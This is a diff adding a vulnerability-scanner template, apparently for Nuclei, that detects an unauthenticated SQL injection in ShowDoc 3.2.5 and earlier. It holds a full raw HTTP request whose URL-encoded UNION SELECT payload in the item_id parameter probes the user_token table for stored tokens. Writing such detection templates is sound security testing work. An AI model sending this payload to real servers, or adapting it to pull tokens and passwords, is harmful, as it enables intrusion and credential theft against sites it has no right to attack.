@@ -1,0 +1,26 @@
+id: showdoc-index-sqli
+info:
+  name: ShowDoc 3.2.5 SQL注入漏洞和反序列化漏洞
+  author: wangzong
+  severity: high
+  description: ShowDoc <= 3.2.5 存在一处未授权SQL注入漏洞，攻击者可以利用该漏洞窃取保存在SQLite数据库中的用户密码和Token。
+  reference:
+    - https://github.com/vulhub/vulhub/blob/master/showdoc/3.2.5-sqli/README.zh-cn.md
+    - https://github.com/vulhub/vulhub/blob/master/showdoc/3.2.5-sqli/poc.py
+    - https://github.com/wy876/POC/blob/main/showdoc3.2.4-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /server/index.php?s=%2Fapi%2Fitem%2Fpwd&page_id=0&password=1&captcha_id=851&captcha=3ea8&item_id=aa%27%29+UNION+SELECT+1%2C1%2C1%2C1%2C1%2C%28SELECT+1+FROM+user_token+WHERE+uid+%3D+1+AND+token+LIKE+%2730%25%27+LIMIT+1%29%2C1%2C1%2C1%2C1%2C1%2C1+FROM+user_token%3B+--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.32.2
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '10206'
